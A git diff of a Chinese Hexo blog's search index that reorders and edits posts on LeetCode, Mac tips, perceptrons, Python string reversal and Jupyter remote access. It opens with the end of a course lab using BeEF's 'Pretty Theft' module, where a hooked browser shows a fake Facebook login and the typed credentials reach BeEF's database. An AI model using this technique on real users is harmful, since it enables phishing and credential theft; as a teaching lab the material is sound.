+<p><img src="/2019/09/18/hacker-4/15.png" alt="15.png"></p>
+<p>看它成功返回了hello这个结果。现在让我们回到之前beef那个页面，去看看那里有什么改变。</p>
+<p><img src="/2019/09/18/hacker-4/16.png" alt="16.png"></p>
+<p>你会发现在左边的Online Browsers文件夹中出现了一台主机，</p>
+<p>让我们点击它，出现下面这个页面：</p>
+<p><img src="/2019/09/18/hacker-4/17.png" alt="17.png"></p>
+<p>点击Commands，让我去社会工程学栏中寻找一个叫做Pretty Theft的脚本文件，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/18.png" alt="18.png"></p>
+<p>现在我们可以点击右下角的Execute了。</p>
+<p>让我们回到另一个打开的页面，你会发现弹出了一个类似于facebook的弹窗，如下显示：</p>
+<p><img src="/2019/09/18/hacker-4/19.png" alt="19.png"></p>
+<p>当我们在里面输入Email和密码之后点击log in，你所输入的信息就会到beef的后台数据库中。</p>
+<p>回到beef页面，你会在数据库中看到如下信息：</p>
+<p><img src="/2019/09/18/hacker-4/20.png" alt="20.png"></p>
+<p>到这里这个实验就结束了！</p>
 ]]></content>
       <categories>
-        <category>Daily Essays</category>
+        <category>软件综合训练课程</category>
       </categories>
   </entry>
   <entry>
@@ -582,37 +582,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Leetcode-18.四数之和</title>
-    <url>/2020/10/05/leetcode-sumof4/</url>
-    <content><![CDATA[<p>给定一个包含<strong>n</strong>个整数的数组<strong>num</strong>和一个目标值<strong>target</strong>，判断<strong>nums</strong>中是否存在四个元素a, b, c和d，使得a+b+c+d的值与<strong>target</strong>相等？找出所有满足条件且不重复的四元组。答案中不可以包含重复的四元组。<a id="more"></a></p>
-<p><strong>示例</strong>：</p>
-<p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">给定数组 nums = [1, 0, -1, 0, -2, 2]，和 target = 0。</span><br><span class="line"></span><br><span class="line">满足要求的四元组集合为：</span><br><span class="line">[</span><br><span class="line">  [-1,  0, 0, 1],</span><br><span class="line">  [-2, -1, 1, 2],</span><br><span class="line">  [-2,  0, 0, 2]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
-<p><strong>代码</strong>：</p>
-<p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fourSum</span><span class="hljs-params">(self, nums: List[int], target: int)</span> -&gt; List[List[int]]:</span></span><br><span class="line">        N = len(nums)</span><br><span class="line">        nums_asc = sorted(nums)</span><br><span class="line">        ans = []</span><br><span class="line">        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, N<span class="hljs-number">-3</span>):</span><br><span class="line">          	<span class="hljs-comment"># 判断是否与前一个值相等</span></span><br><span class="line">            <span class="hljs-keyword">if</span> a&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> nums_asc[a]==nums_asc[a<span class="hljs-number">-1</span>]:</span><br><span class="line">                <span class="hljs-keyword">continue</span></span><br><span class="line">            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> range(a+<span class="hljs-number">1</span>, N<span class="hljs-number">-2</span>):</span><br><span class="line">                <span class="hljs-keyword">if</span> b&gt;a+<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> nums_asc[b]==nums_asc[b<span class="hljs-number">-1</span>]:</span><br><span class="line">                    <span class="hljs-keyword">continue</span></span><br><span class="line">                c, d = b+<span class="hljs-number">1</span>, N<span class="hljs-number">-1</span></span><br><span class="line">                <span class="hljs-keyword">while</span>(c&lt;d):</span><br><span class="line">                    val = nums_asc[a]+nums_asc[b]+nums_asc[c]+nums_asc[d]</span><br><span class="line">                    <span class="hljs-keyword">if</span> val &gt; target:</span><br><span class="line">                        d-=<span class="hljs-number">1</span></span><br><span class="line">                    <span class="hljs-keyword">elif</span> val &lt; target:</span><br><span class="line">                        c+=<span class="hljs-number">1</span></span><br><span class="line">                    <span class="hljs-keyword">else</span>:</span><br><span class="line">                        ans.append([nums_asc[a], nums_asc[b], nums_asc[c], nums_asc[d]])</span><br><span class="line">                        <span class="hljs-comment"># 跳过相等的元素</span></span><br><span class="line">                        <span class="hljs-keyword">while</span>(c&lt;d <span class="hljs-keyword">and</span> nums_asc[c]==nums_asc[c+<span class="hljs-number">1</span>]):</span><br><span class="line">                            c+=<span class="hljs-number">1</span></span><br><span class="line">                        <span class="hljs-keyword">while</span>(c&lt;d <span class="hljs-keyword">and</span> nums_asc[d]==nums_asc[d<span class="hljs-number">-1</span>]):</span><br><span class="line">                            d-=<span class="hljs-number">1</span></span><br><span class="line">                        c += <span class="hljs-number">1</span></span><br><span class="line">                        d -= <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">return</span> ans</span><br></pre></td></tr></table></figure></p>
-<p>双指针法，使用a, b, c, d四个变量，分别代表最小值，第二小值，剩余元素的首位和末尾。利用两个循环，外循环为a，内循环为b，循环体内通过判断四个值的和与<strong>target</strong>的大小关系，从而相应移动c, d。最后通过while循环过滤掉值相等的元素以防止得到重复的结果。</p>
-]]></content>
-      <categories>
-        <category>LeetCode系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Mac使用小技巧</title>
-    <url>/2020/03/12/mac-tips/</url>
-    <content><![CDATA[<p>此贴长期更新<a id="more"></a></p>
-<h3 id="1-隐藏桌面所有文件-文件夹"><a href="#1-隐藏桌面所有文件-文件夹" class="headerlink" title="1. 隐藏桌面所有文件/文件夹"></a>1. 隐藏桌面所有文件/文件夹</h3><p>隐藏：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">false</span>;killall Finder</span><br></pre></td></tr></table></figure><br>恢复显示：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">true</span>;killall Finder</span><br></pre></td></tr></table></figure></p>
-<h3 id="2-微调音量-亮度"><a href="#2-微调音量-亮度" class="headerlink" title="2. 微调音量/亮度"></a>2. 微调音量/亮度</h3><p><code>option + shift + 音量/亮度</code></p>
-<h3 id="3-切换应用程序"><a href="#3-切换应用程序" class="headerlink" title="3. 切换应用程序"></a>3. 切换应用程序</h3><p><code>command + Tab</code> 从左-&gt;右<br><code>command + shift + Tab</code> 反向</p>
-<h3 id="4-常用快捷键（持续更新）"><a href="#4-常用快捷键（持续更新）" class="headerlink" title="4. 常用快捷键（持续更新）"></a>4. 常用快捷键（持续更新）</h3><ul>
-<li>浏览器中将网页加入个人收藏：<code>command + D</code></li>
-<li>浏览器新建标签页：<code>command + T</code></li>
-<li>快速调用emoji表情：<code>control + command + space</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Python 多进程</title>
     <url>/2019/08/27/multiprocessing/</url>
     <content><![CDATA[<p>学习廖雪峰的Python教程中的多进程部分，知识点整理<a id="more"></a></p>
@@ -648,6 +617,37 @@
       </categories>
   </entry>
   <entry>
+    <title>Leetcode-18.四数之和</title>
+    <url>/2020/10/05/leetcode-sumof4/</url>
+    <content><![CDATA[<p>给定一个包含<strong>n</strong>个整数的数组<strong>num</strong>和一个目标值<strong>target</strong>，判断<strong>nums</strong>中是否存在四个元素a, b, c和d，使得a+b+c+d的值与<strong>target</strong>相等？找出所有满足条件且不重复的四元组。答案中不可以包含重复的四元组。<a id="more"></a></p>
+<p><strong>示例</strong>：</p>
+<p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">给定数组 nums = [1, 0, -1, 0, -2, 2]，和 target = 0。</span><br><span class="line"></span><br><span class="line">满足要求的四元组集合为：</span><br><span class="line">[</span><br><span class="line">  [-1,  0, 0, 1],</span><br><span class="line">  [-2, -1, 1, 2],</span><br><span class="line">  [-2,  0, 0, 2]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
+<p><strong>代码</strong>：</p>
+<p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fourSum</span><span class="hljs-params">(self, nums: List[int], target: int)</span> -&gt; List[List[int]]:</span></span><br><span class="line">        N = len(nums)</span><br><span class="line">        nums_asc = sorted(nums)</span><br><span class="line">        ans = []</span><br><span class="line">        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, N<span class="hljs-number">-3</span>):</span><br><span class="line">          	<span class="hljs-comment"># 判断是否与前一个值相等</span></span><br><span class="line">            <span class="hljs-keyword">if</span> a&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> nums_asc[a]==nums_asc[a<span class="hljs-number">-1</span>]:</span><br><span class="line">                <span class="hljs-keyword">continue</span></span><br><span class="line">            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> range(a+<span class="hljs-number">1</span>, N<span class="hljs-number">-2</span>):</span><br><span class="line">                <span class="hljs-keyword">if</span> b&gt;a+<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> nums_asc[b]==nums_asc[b<span class="hljs-number">-1</span>]:</span><br><span class="line">                    <span class="hljs-keyword">continue</span></span><br><span class="line">                c, d = b+<span class="hljs-number">1</span>, N<span class="hljs-number">-1</span></span><br><span class="line">                <span class="hljs-keyword">while</span>(c&lt;d):</span><br><span class="line">                    val = nums_asc[a]+nums_asc[b]+nums_asc[c]+nums_asc[d]</span><br><span class="line">                    <span class="hljs-keyword">if</span> val &gt; target:</span><br><span class="line">                        d-=<span class="hljs-number">1</span></span><br><span class="line">                    <span class="hljs-keyword">elif</span> val &lt; target:</span><br><span class="line">                        c+=<span class="hljs-number">1</span></span><br><span class="line">                    <span class="hljs-keyword">else</span>:</span><br><span class="line">                        ans.append([nums_asc[a], nums_asc[b], nums_asc[c], nums_asc[d]])</span><br><span class="line">                        <span class="hljs-comment"># 跳过相等的元素</span></span><br><span class="line">                        <span class="hljs-keyword">while</span>(c&lt;d <span class="hljs-keyword">and</span> nums_asc[c]==nums_asc[c+<span class="hljs-number">1</span>]):</span><br><span class="line">                            c+=<span class="hljs-number">1</span></span><br><span class="line">                        <span class="hljs-keyword">while</span>(c&lt;d <span class="hljs-keyword">and</span> nums_asc[d]==nums_asc[d<span class="hljs-number">-1</span>]):</span><br><span class="line">                            d-=<span class="hljs-number">1</span></span><br><span class="line">                        c += <span class="hljs-number">1</span></span><br><span class="line">                        d -= <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">return</span> ans</span><br></pre></td></tr></table></figure></p>
+<p>双指针法，使用a, b, c, d四个变量，分别代表最小值，第二小值，剩余元素的首位和末尾。利用两个循环，外循环为a，内循环为b，循环体内通过判断四个值的和与<strong>target</strong>的大小关系，从而相应移动c, d。最后通过while循环过滤掉值相等的元素以防止得到重复的结果。</p>
+]]></content>
+      <categories>
+        <category>LeetCode系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Mac使用小技巧</title>
+    <url>/2020/03/12/mac-tips/</url>
+    <content><![CDATA[<p>此贴长期更新<a id="more"></a></p>
+<h3 id="1-隐藏桌面所有文件-文件夹"><a href="#1-隐藏桌面所有文件-文件夹" class="headerlink" title="1. 隐藏桌面所有文件/文件夹"></a>1. 隐藏桌面所有文件/文件夹</h3><p>隐藏：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">false</span>;killall Finder</span><br></pre></td></tr></table></figure><br>恢复显示：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">true</span>;killall Finder</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-微调音量-亮度"><a href="#2-微调音量-亮度" class="headerlink" title="2. 微调音量/亮度"></a>2. 微调音量/亮度</h3><p><code>option + shift + 音量/亮度</code></p>
+<h3 id="3-切换应用程序"><a href="#3-切换应用程序" class="headerlink" title="3. 切换应用程序"></a>3. 切换应用程序</h3><p><code>command + Tab</code> 从左-&gt;右<br><code>command + shift + Tab</code> 反向</p>
+<h3 id="4-常用快捷键（持续更新）"><a href="#4-常用快捷键（持续更新）" class="headerlink" title="4. 常用快捷键（持续更新）"></a>4. 常用快捷键（持续更新）</h3><ul>
+<li>浏览器中将网页加入个人收藏：<code>command + D</code></li>
+<li>浏览器新建标签页：<code>command + T</code></li>
+<li>快速调用emoji表情：<code>control + command + space</code></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
     <title>朴素贝叶斯的三个常用模型</title>
     <url>/2019/10/14/navie-bayes/</url>
     <content><![CDATA[<p>高斯、多项式、伯努利<a id="more"></a></p>
@@ -671,6 +671,18 @@
 ]]></content>
       <categories>
         <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>感知机原理及其代码实现</title>
+    <url>/2020/07/03/perceptron/</url>
+    <content><![CDATA[<p>开始更新《统计学习方法》的笔记理解以及代码实现系列。边学边记录吧，加油。<a id="more"></a></p>
+<p>感知机(perceptron)是二类分类的线形分类模型，其输入为实例的特征向量，输出为实例的类别，取<code>+1</code>和<code>-1</code>二值。感知机对应于输入空间（特征空间）中将实例划分为正负两类的分离超平面，属于<strong>判别模型</strong>。其旨在求出将训练数据进行线性划分的分离超平面，为此，导入基于误分类的损失函数，利用梯度下降法对损失函数进行极小化，求得感知机模型。分为原始形式和对偶形式。感知机在1957年由Rosenblatt提出，是神经网络与支持向量机的基础。——摘自《统计学习方法》P35。</p>
+<h3 id="1-感知机模型"><a href="#1-感知机模型" class="headerlink" title="1. 感知机模型"></a>1. 感知机模型</h3><p>定义（感知机）：假设输入空间（特征空间）是 $\chi \subseteq \mathcal{R}^2$，输出空间是 $\mathcal{Y} = \lbrace+1, -1\rbrace$。输入$x \in \chi$表示实例的特征向量，对应于输入空间（特征空间）的点；输出$y \in \mathcal{Y}$表示实例的类别。由输入空间到输出空间的如下函数：<br>$$f(x) = sign(w \cdot x + b) \tag{1.1}$$<br>称为感知机。其中 $w$ 和 $b$ 为感知机模型参数，$w \in \mathcal{R}^n$ 叫作权值(weight)或权值向量(weight vector)，$b \in \mathcal{R}$ 叫作偏置(bias)，$w \cdot x + b$ 表示 $w$ 和 $x$ 的内积。$sign$ 是符号函数，即<br>$$f(x)=<br>\begin{cases}<br>0&amp; \text{x=0}\<br>1&amp; \text{x!=0}<br>\end{cases}$$</p>
+<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">好久之前挖的坑...找时间再填吧。</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>统计学习方法</category>
       </categories>
   </entry>
   <entry>
@@ -701,18 +713,6 @@
       </categories>
   </entry>
   <entry>
-    <title>感知机原理及其代码实现</title>
-    <url>/2020/07/03/perceptron/</url>
-    <content><![CDATA[<p>开始更新《统计学习方法》的笔记理解以及代码实现系列。边学边记录吧，加油。<a id="more"></a></p>
-<p>感知机(perceptron)是二类分类的线形分类模型，其输入为实例的特征向量，输出为实例的类别，取<code>+1</code>和<code>-1</code>二值。感知机对应于输入空间（特征空间）中将实例划分为正负两类的分离超平面，属于<strong>判别模型</strong>。其旨在求出将训练数据进行线性划分的分离超平面，为此，导入基于误分类的损失函数，利用梯度下降法对损失函数进行极小化，求得感知机模型。分为原始形式和对偶形式。感知机在1957年由Rosenblatt提出，是神经网络与支持向量机的基础。——摘自《统计学习方法》P35。</p>
-<h3 id="1-感知机模型"><a href="#1-感知机模型" class="headerlink" title="1. 感知机模型"></a>1. 感知机模型</h3><p>定义（感知机）：假设输入空间（特征空间）是 $\chi \subseteq \mathcal{R}^2$，输出空间是 $\mathcal{Y} = \lbrace+1, -1\rbrace$。输入$x \in \chi$表示实例的特征向量，对应于输入空间（特征空间）的点；输出$y \in \mathcal{Y}$表示实例的类别。由输入空间到输出空间的如下函数：<br>$$f(x) = sign(w \cdot x + b) \tag{1.1}$$<br>称为感知机。其中 $w$ 和 $b$ 为感知机模型参数，$w \in \mathcal{R}^n$ 叫作权值(weight)或权值向量(weight vector)，$b \in \mathcal{R}$ 叫作偏置(bias)，$w \cdot x + b$ 表示 $w$ 和 $x$ 的内积。$sign$ 是符号函数，即<br>$$f(x)=<br>\begin{cases}<br>0&amp; \text{x=0}\<br>1&amp; \text{x!=0}<br>\end{cases}$$</p>
-<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">好久之前挖的坑...找时间再填吧。</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>统计学习方法</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Python中如何定义二维数组</title>
     <url>/2019/11/17/py-cre-douarr/</url>
     <content><![CDATA[<p>小知识点随手记录…<a id="more"></a></p>
@@ -726,17 +726,15 @@
       </categories>
   </entry>
   <entry>
-    <title>Python实现字符串反转的几种方法</title>
-    <url>/2019/11/15/py-str-reverse/</url>
-    <content><![CDATA[<p>你能想到几种？<a id="more"></a></p>
-<h3 id="1-使用字符串切片"><a href="#1-使用字符串切片" class="headerlink" title="1. 使用字符串切片"></a>1. 使用字符串切片</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = s[::<span class="hljs-number">-1</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2-使用列表的reverse方法"><a href="#2-使用列表的reverse方法" class="headerlink" title="2. 使用列表的reverse方法"></a>2. 使用列表的reverse方法</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l.reverse()</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'g'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'a'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>同理，可以用<code>&#39;&#39;.join(l[::-1])</code><br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">-1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="3-使用reduce"><a href="#3-使用reduce" class="headerlink" title="3. 使用reduce"></a>3. 使用reduce</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = reduce(<span class="hljs-keyword">lambda</span> x,y:y+x, s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>在这里简单复习一下reduce<br>使用<code>reduce</code>需要先<code>from functools import reduce</code><br><code>reduce</code>有2个参数，一个是函数，另一个是可迭代对象。在这里的函数是匿名函数<code>lambda</code>，作用是输入x和y返回y+x，可迭代对象是字符串<code>&#39;abcdefg&#39;</code>。<br>具体过程是<code>x = &#39;a&#39;, y = &#39;b&#39;</code>返回<code>&#39;ba&#39;</code>，之后<code>&#39;x = &#39;ba&#39;, y = c</code>返回<code>&#39;cba&#39;</code>这样迭代完整个字符串就可以达到反转字符串的效果。</p>
-<h3 id="4-使用递归函数"><a href="#4-使用递归函数" class="headerlink" title="4. 使用递归函数"></a>4. 使用递归函数</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	<span class="hljs-keyword">if</span> len(s) == <span class="hljs-number">1</span>:</span><br><span class="line">		<span class="hljs-keyword">return</span> s</span><br><span class="line">	<span class="hljs-keyword">return</span> func(s[<span class="hljs-number">1</span>:]) + s[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p>
-<h3 id="5-使用栈"><a href="#5-使用栈" class="headerlink" title="5. 使用栈"></a>5. 使用栈</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	<span class="hljs-comment">#模拟全部字符入栈</span></span><br><span class="line">	l = list(s)</span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	<span class="hljs-keyword">while</span> len(l)&gt;<span class="hljs-number">0</span>:</span><br><span class="line">		<span class="hljs-comment">#模拟出栈</span></span><br><span class="line">		ans += l.pop()</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p>
-<h3 id="6-for循环"><a href="#6-for循环" class="headerlink" title="6. for循环"></a>6. for循环</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	max_index = len(s) - <span class="hljs-number">1</span></span><br><span class="line">	<span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(s):</span><br><span class="line">		ans += s[max_index-index]</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure><br>简单学习一下<code>enumerate</code>，它是python中的内置函数，适用于python2.x和python3.x<br><code>enumerate</code>在字典里是枚举、列举的意思<br><code>enumerate</code>参数为可遍历/可迭代的对象（如列表、字符串等）<br>例如：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(l):</span><br><span class="line"><span class="hljs-meta">... </span>    print(<span class="hljs-string">'%s, %s'</span> % (index, value))</span><br><span class="line">...</span><br><span class="line"><span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-number">2</span>, <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">3</span>, <span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-number">4</span>, <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-number">5</span>, <span class="hljs-number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>
-<hr>
-<p>转自<a href="https://www.cnblogs.com/taceywong/p/8045127.html" target="_blank" rel="noopener">https://www.cnblogs.com/taceywong/p/8045127.html</a></p>
+    <title>服务器配置jupyter notebook实现远程访问</title>
+    <url>/2019/12/14/remote-jupyternotebook/</url>
+    <content><![CDATA[<p><code>jupyter notebook</code>简单配置，随手记录，以备遗忘。<a id="more"></a><br>最近开始想从头系统的学习一下深度学习，以便为以后三年的研究生的学习生活打基础，顺便将之前租的阿里云服务器利用起来，于是就配置一下<code>jupyter notebook</code>吧</p>
+<h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><p><code>jupyter notebook</code>会随着<code>Anaconda</code>一起安装好，因此我们只需要安装好<code>Anaconda</code>就好，详情请参照之前的博客。</p>
+<h3 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h3><h4 id="1-生成配置文件"><a href="#1-生成配置文件" class="headerlink" title="1. 生成配置文件"></a>1. 生成配置文件</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --generate-config</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-设置密码并生成密钥"><a href="#2-设置密码并生成密钥" class="headerlink" title="2. 设置密码并生成密钥"></a>2. 设置密码并生成密钥</h4><p><code>shell</code>下输入<code>python</code><br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> notebook.auth <span class="hljs-keyword">import</span> passwd</span><br><span class="line">passwd()</span><br></pre></td></tr></table></figure><br>会出现让我们输入密码、确认密码<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">Enter password: </span><br><span class="line">Verify password: </span><br><span class="line"><span class="hljs-string">'sha1:*************’</span></span><br></pre></td></tr></table></figure><br>这个生成的密钥要记住，找个地方复制粘贴下来。</p>
+<h4 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3. 修改配置文件"></a>3. 修改配置文件</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">c.NotebookApp.ip=<span class="hljs-string">'*'</span>    <span class="hljs-comment">#允许访问的IP地址，设置为*代表允许任何客户端访问</span></span><br><span class="line">c.NotebookApp.password = <span class="hljs-string">u'sha1:8d...'</span><span class="hljs-comment">#		刚才生成密码时复制的密文</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="hljs-literal">False</span>    <span class="hljs-comment">#True的话会自动弹出窗口</span></span><br><span class="line">c.NotebookApp.port = <span class="hljs-number">5555</span>  <span class="hljs-comment">#可自行指定一个端口, 访问时使用该端口</span></span><br><span class="line">c.NotebookApp.allow_remote_access = <span class="hljs-literal">True</span>   <span class="hljs-comment">#这个一定得设置，不然会报错</span></span><br></pre></td></tr></table></figure><br>别忘了保存。<br>哦，如果你是国内的服务器厂商诸如腾讯云、阿里云之类的，还需要添加一下安全组规则。</p>
+<h3 id="三、远程访问"><a href="#三、远程访问" class="headerlink" title="三、远程访问"></a>三、远程访问</h3><p>在服务器输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure><br>就可以开启<code>jupyter notebook</code>进程了<br>如果访问的是/root目录，还需要root权限<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --allow-root</span><br></pre></td></tr></table></figure><br>之后就可以在本地浏览器输入<code>ip:port</code>实现远程访问<code>jupyter notebook</code>了<br>（第一次访问会输入密码。）</p>
+<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>我们可以使用<code>screen</code>命令实现<code>jupyter notebook</code>后台运行，这样我们去用服务器干别的事情啦。<br>输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -S process_name</span><br></pre></td></tr></table></figure><br>之后运行<code>jupyter notebook</code>就可以了，返回键为<code>ctrl</code> + <code>A</code> + <code>D</code><br>显示后台程序输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -r process_name</span><br></pre></td></tr></table></figure><br>如果服务器没有<code>screen</code>命令请安装<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install screen</span><br></pre></td></tr></table></figure></p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
@@ -770,21 +768,6 @@
       </categories>
   </entry>
   <entry>
-    <title>服务器配置jupyter notebook实现远程访问</title>
-    <url>/2019/12/14/remote-jupyternotebook/</url>
